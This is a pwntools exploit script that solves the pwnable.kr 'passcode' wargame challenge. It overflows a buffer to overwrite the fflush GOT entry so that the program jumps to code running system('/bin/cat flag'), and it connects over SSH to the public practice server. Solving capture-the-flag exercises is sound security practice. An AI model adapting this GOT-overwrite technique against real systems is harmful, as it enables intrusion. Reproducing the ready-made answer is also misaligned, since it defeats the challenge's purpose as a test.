from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/passcode')
else:
    s = ssh('passcode', 'pwnable.kr', 2222, 'guest')
    r = s.process('./passcode')

sla = r.sendlineafter

fflush_got = 0x804a004
flag = 0x80485e3 # login+127 ( system("/bin/cat flag") )

sla('Toddler\'s Secure Login System 1.0 beta.\n', b'A' * 96 + p32(fflush_got))

r.sendline(str(flag)) # fflush@GOT -> system("/bin/cat flag")

r.interactive()